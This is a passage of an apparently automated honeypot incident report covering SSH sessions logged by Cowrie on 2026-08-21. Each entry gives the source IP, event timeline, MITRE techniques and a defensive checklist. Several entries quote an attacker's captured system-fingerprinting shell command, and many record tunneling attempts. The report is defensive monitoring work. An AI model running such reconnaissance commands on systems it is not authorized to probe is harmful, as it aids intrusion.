| `2026-08-21 17:15:44` | `cowrie.client.kex` |
| `2026-08-21 17:15:45` | `cowrie.login.success` |
| `2026-08-21 17:15:45` | `cowrie.direct-tcpip.request` |
| `2026-08-21 17:15:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.103.15[.]75` to AbuseIPDB if not already reported
- [ ] Block `176.103.15[.]75` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec4459e3c908

| Field | Detail |
|---|---|
| **Source IP** | `103.93.37[.]178` |
| **First Seen** | 2026-08-21 17:15 |
| **Last Seen** | 2026-08-21 17:15 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 17:15:50` | `cowrie.session.connect` |
| `2026-08-21 17:15:51` | `cowrie.client.version` |
| `2026-08-21 17:15:51` | `cowrie.client.kex` |
| `2026-08-21 17:15:53` | `cowrie.login.success` |
| `2026-08-21 17:15:54` | `cowrie.direct-tcpip.request` |
| `2026-08-21 17:15:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.93.37[.]178` to AbuseIPDB if not already reported
- [ ] Block `103.93.37[.]178` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b227aea633a7

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-21 17:18 |
| **Last Seen** | 2026-08-21 17:18 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 17:18:01` | `cowrie.session.connect` |
| `2026-08-21 17:18:01` | `cowrie.client.version` |
| `2026-08-21 17:18:01` | `cowrie.client.kex` |
| `2026-08-21 17:18:02` | `cowrie.login.success` |
| `2026-08-21 17:18:04` | `cowrie.session.params` |
| `2026-08-21 17:18:04` | `cowrie.command.input` |
| `2026-08-21 17:18:04` | `cowrie.command.input` |
| `2026-08-21 17:18:04` | `cowrie.command.input` |
| `2026-08-21 17:18:04` | `cowrie.command.input` |
| `2026-08-21 17:18:04` | `cowrie.command.input` |
| `2026-08-21 17:18:04` | `cowrie.command.success` |
| `2026-08-21 17:18:04` | `cowrie.command.input` |
| `2026-08-21 17:18:04` | `cowrie.command.input` |
| `2026-08-21 17:18:04` | `cowrie.command.input` |
| `2026-08-21 17:18:04` | `cowrie.command.input` |
| `2026-08-21 17:18:04` | `cowrie.log.closed` |
| `2026-08-21 17:18:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d54101de9ff0

| Field | Detail |
|---|---|
| **Source IP** | `112.164.195[.]219` |
| **First Seen** | 2026-08-21 17:19 |
| **Last Seen** | 2026-08-21 17:19 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 17:19:27` | `cowrie.session.connect` |
| `2026-08-21 17:19:27` | `cowrie.client.version` |
| `2026-08-21 17:19:27` | `cowrie.client.kex` |
| `2026-08-21 17:19:30` | `cowrie.login.success` |
| `2026-08-21 17:19:30` | `cowrie.direct-tcpip.request` |
| `2026-08-21 17:19:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.164.195[.]219` to AbuseIPDB if not already reported
- [ ] Block `112.164.195[.]219` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-71908da4c662

| Field | Detail |
|---|---|
| **Source IP** | `140.186.53[.]181` |
| **First Seen** | 2026-08-21 17:19 |
| **Last Seen** | 2026-08-21 17:19 |
| **Session Duration** | 19s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 17:19:38` | `cowrie.session.connect` |
| `2026-08-21 17:19:41` | `cowrie.client.version` |
| `2026-08-21 17:19:41` | `cowrie.client.kex` |
| `2026-08-21 17:19:48` | `cowrie.login.success` |
| `2026-08-21 17:19:51` | `cowrie.direct-tcpip.request` |
| `2026-08-21 17:19:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `140.186.53[.]181` to AbuseIPDB if not already reported
- [ ] Block `140.186.53[.]181` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7de29dc6e271

| Field | Detail |
|---|---|
| **Source IP** | `63.47.149[.]59` |
| **First Seen** | 2026-08-21 17:19 |
| **Last Seen** | 2026-08-21 17:19 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 17:19:38` | `cowrie.session.connect` |
| `2026-08-21 17:19:39` | `cowrie.client.version` |
| `2026-08-21 17:19:39` | `cowrie.client.kex` |
| `2026-08-21 17:19:41` | `cowrie.login.success` |
| `2026-08-21 17:19:42` | `cowrie.direct-tcpip.request` |
| `2026-08-21 17:19:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `63.47.149[.]59` to AbuseIPDB if not already reported
- [ ] Block `63.47.149[.]59` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-111f1f622bd8

| Field | Detail |
|---|---|
| **Source IP** | `190.75.248[.]87` |
| **First Seen** | 2026-08-21 17:19 |
| **Last Seen** | 2026-08-21 17:19 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 17:19:51` | `cowrie.session.connect` |
| `2026-08-21 17:19:52` | `cowrie.client.version` |
| `2026-08-21 17:19:52` | `cowrie.client.kex` |
| `2026-08-21 17:19:53` | `cowrie.login.success` |
| `2026-08-21 17:19:53` | `cowrie.direct-tcpip.request` |
| `2026-08-21 17:19:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.75.248[.]87` to AbuseIPDB if not already reported
- [ ] Block `190.75.248[.]87` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cbddc461ab05

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-21 17:20 |
| **Last Seen** | 2026-08-21 17:20 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 17:20:35` | `cowrie.session.connect` |
| `2026-08-21 17:20:35` | `cowrie.client.version` |
| `2026-08-21 17:20:35` | `cowrie.client.kex` |
| `2026-08-21 17:20:37` | `cowrie.login.success` |
| `2026-08-21 17:20:38` | `cowrie.session.params` |
| `2026-08-21 17:20:38` | `cowrie.command.input` |
| `2026-08-21 17:20:38` | `cowrie.command.input` |
| `2026-08-21 17:20:38` | `cowrie.command.input` |
| `2026-08-21 17:20:38` | `cowrie.command.input` |
| `2026-08-21 17:20:38` | `cowrie.command.input` |
| `2026-08-21 17:20:38` | `cowrie.command.success` |
| `2026-08-21 17:20:38` | `cowrie.command.input` |
| `2026-08-21 17:20:38` | `cowrie.command.input` |
| `2026-08-21 17:20:38` | `cowrie.command.input` |
| `2026-08-21 17:20:38` | `cowrie.command.input` |
| `2026-08-21 17:20:38` | `cowrie.log.closed` |
| `2026-08-21 17:20:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-038485b728cd

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-21 17:22 |
| **Last Seen** | 2026-08-21 17:22 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 17:22:25` | `cowrie.session.connect` |
| `2026-08-21 17:22:25` | `cowrie.client.version` |
| `2026-08-21 17:22:25` | `cowrie.client.kex` |
| `2026-08-21 17:22:27` | `cowrie.login.success` |
| `2026-08-21 17:22:28` | `cowrie.direct-tcpip.request` |
| `2026-08-21 17:22:30` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-21 17:22:30` | `cowrie.direct-tcpip.data` |
| `2026-08-21 17:22:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c5320f8f62d2

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-21 17:22 |
| **Last Seen** | 2026-08-21 17:22 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 17:22:30` | `cowrie.session.connect` |
| `2026-08-21 17:22:30` | `cowrie.client.version` |
| `2026-08-21 17:22:31` | `cowrie.client.kex` |
| `2026-08-21 17:22:33` | `cowrie.login.success` |
| `2026-08-21 17:22:35` | `cowrie.direct-tcpip.request` |
| `2026-08-21 17:22:37` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-21 17:22:37` | `cowrie.direct-tcpip.data` |
| `2026-08-21 17:22:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2ff16cc64a2b

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-21 17:23 |
| **Last Seen** | 2026-08-21 17:23 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 17:23:11` | `cowrie.session.connect` |
| `2026-08-21 17:23:11` | `cowrie.client.version` |
| `2026-08-21 17:23:11` | `cowrie.client.kex` |
| `2026-08-21 17:23:13` | `cowrie.login.success` |
| `2026-08-21 17:23:14` | `cowrie.session.params` |
| `2026-08-21 17:23:14` | `cowrie.command.input` |
| `2026-08-21 17:23:14` | `cowrie.command.input` |
| `2026-08-21 17:23:14` | `cowrie.command.input` |
| `2026-08-21 17:23:14` | `cowrie.command.input` |
| `2026-08-21 17:23:14` | `cowrie.command.input` |
| `2026-08-21 17:23:14` | `cowrie.command.success` |
| `2026-08-21 17:23:14` | `cowrie.command.input` |
| `2026-08-21 17:23:14` | `cowrie.command.input` |
| `2026-08-21 17:23:14` | `cowrie.command.input` |
| `2026-08-21 17:23:14` | `cowrie.command.input` |
| `2026-08-21 17:23:14` | `cowrie.log.closed` |
| `2026-08-21 17:23:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9ec9b2f4ede5

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-21 17:25 |
| **Last Seen** | 2026-08-21 17:25 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 17:25:50` | `cowrie.session.connect` |
| `2026-08-21 17:25:50` | `cowrie.client.version` |
| `2026-08-21 17:25:50` | `cowrie.client.kex` |
| `2026-08-21 17:25:50` | `cowrie.login.success` |
| `2026-08-21 17:25:52` | `cowrie.session.params` |
| `2026-08-21 17:25:52` | `cowrie.command.input` |
| `2026-08-21 17:25:52` | `cowrie.command.input` |
| `2026-08-21 17:25:52` | `cowrie.command.input` |
| `2026-08-21 17:25:52` | `cowrie.command.input` |
| `2026-08-21 17:25:52` | `cowrie.command.input` |
| `2026-08-21 17:25:52` | `cowrie.command.success` |
| `2026-08-21 17:25:52` | `cowrie.command.input` |
| `2026-08-21 17:25:52` | `cowrie.command.input` |
| `2026-08-21 17:25:52` | `cowrie.command.input` |
| `2026-08-21 17:25:52` | `cowrie.command.input` |
| `2026-08-21 17:25:52` | `cowrie.log.closed` |
| `2026-08-21 17:25:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8c2713f0b8bc

| Field | Detail |
|---|---|
| **Source IP** | `66.45.144[.]201` |
| **First Seen** | 2026-08-21 17:26 |
| **Last Seen** | 2026-08-21 17:26 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 17:26:10` | `cowrie.session.connect` |
| `2026-08-21 17:26:10` | `cowrie.client.version` |
| `2026-08-21 17:26:10` | `cowrie.client.kex` |
| `2026-08-21 17:26:12` | `cowrie.login.success` |
| `2026-08-21 17:26:12` | `cowrie.direct-tcpip.request` |
| `2026-08-21 17:26:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `66.45.144[.]201` to AbuseIPDB if not already reported
- [ ] Block `66.45.144[.]201` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-078fa1d5a9b3

| Field | Detail |
|---|---|
| **Source IP** | `50.223.176[.]171` |
| **First Seen** | 2026-08-21 17:26 |
| **Last Seen** | 2026-08-21 17:26 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 17:26:17` | `cowrie.session.connect` |
| `2026-08-21 17:26:18` | `cowrie.client.version` |
| `2026-08-21 17:26:18` | `cowrie.client.kex` |
| `2026-08-21 17:26:22` | `cowrie.login.success` |
| `2026-08-21 17:26:23` | `cowrie.direct-tcpip.request` |
| `2026-08-21 17:26:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.223.176[.]171` to AbuseIPDB if not already reported
- [ ] Block `50.223.176[.]171` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9d7c60907266

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-21 17:28 |
| **Last Seen** | 2026-08-21 17:28 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 17:28:14` | `cowrie.session.connect` |
| `2026-08-21 17:28:14` | `cowrie.client.version` |
| `2026-08-21 17:28:14` | `cowrie.client.kex` |
| `2026-08-21 17:28:15` | `cowrie.login.success` |
| `2026-08-21 17:28:16` | `cowrie.session.params` |
| `2026-08-21 17:28:16` | `cowrie.command.input` |
| `2026-08-21 17:28:16` | `cowrie.command.input` |
| `2026-08-21 17:28:16` | `cowrie.command.input` |
| `2026-08-21 17:28:16` | `cowrie.command.input` |
| `2026-08-21 17:28:16` | `cowrie.command.input` |
| `2026-08-21 17:28:16` | `cowrie.command.success` |
| `2026-08-21 17:28:16` | `cowrie.command.input` |
| `2026-08-21 17:28:16` | `cowrie.command.input` |
| `2026-08-21 17:28:16` | `cowrie.command.input` |
| `2026-08-21 17:28:16` | `cowrie.command.input` |
| `2026-08-21 17:28:16` | `cowrie.log.closed` |
| `2026-08-21 17:28:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2559fb6dbb56

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-21 17:30 |
| **Last Seen** | 2026-08-21 17:30 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 17:30:46` | `cowrie.session.connect` |
| `2026-08-21 17:30:46` | `cowrie.client.version` |
| `2026-08-21 17:30:46` | `cowrie.client.kex` |
| `2026-08-21 17:30:46` | `cowrie.login.success` |
| `2026-08-21 17:30:48` | `cowrie.session.params` |
| `2026-08-21 17:30:48` | `cowrie.command.input` |
| `2026-08-21 17:30:48` | `cowrie.command.input` |
| `2026-08-21 17:30:48` | `cowrie.command.input` |
| `2026-08-21 17:30:48` | `cowrie.command.input` |
| `2026-08-21 17:30:48` | `cowrie.command.input` |
| `2026-08-21 17:30:48` | `cowrie.command.success` |
| `2026-08-21 17:30:48` | `cowrie.command.input` |
| `2026-08-21 17:30:48` | `cowrie.command.input` |
| `2026-08-21 17:30:48` | `cowrie.command.input` |
| `2026-08-21 17:30:48` | `cowrie.command.input` |
| `2026-08-21 17:30:48` | `cowrie.log.closed` |
| `2026-08-21 17:30:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bbfebdf3b157

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-21 17:33 |
| **Last Seen** | 2026-08-21 17:33 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 17:33:18` | `cowrie.session.connect` |
| `2026-08-21 17:33:18` | `cowrie.client.version` |
| `2026-08-21 17:33:18` | `cowrie.client.kex` |
| `2026-08-21 17:33:18` | `cowrie.login.success` |
| `2026-08-21 17:33:20` | `cowrie.session.params` |
| `2026-08-21 17:33:20` | `cowrie.command.input` |
| `2026-08-21 17:33:20` | `cowrie.command.input` |
| `2026-08-21 17:33:20` | `cowrie.command.input` |
| `2026-08-21 17:33:20` | `cowrie.command.input` |
| `2026-08-21 17:33:20` | `cowrie.command.input` |
| `2026-08-21 17:33:20` | `cowrie.command.success` |
| `2026-08-21 17:33:20` | `cowrie.command.input` |
| `2026-08-21 17:33:20` | `cowrie.command.input` |
| `2026-08-21 17:33:20` | `cowrie.command.input` |
| `2026-08-21 17:33:20` | `cowrie.command.input` |
| `2026-08-21 17:33:20` | `cowrie.log.closed` |
| `2026-08-21 17:33:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-da1464daf806

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-21 17:33 |
| **Last Seen** | 2026-08-21 17:33 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 17:33:20` | `cowrie.session.connect` |
| `2026-08-21 17:33:20` | `cowrie.client.version` |
| `2026-08-21 17:33:21` | `cowrie.client.kex` |
| `2026-08-21 17:33:22` | `cowrie.login.success` |
| `2026-08-21 17:33:24` | `cowrie.direct-tcpip.request` |
| `2026-08-21 17:33:24` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-21 17:33:24` | `cowrie.direct-tcpip.data` |
| `2026-08-21 17:33:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
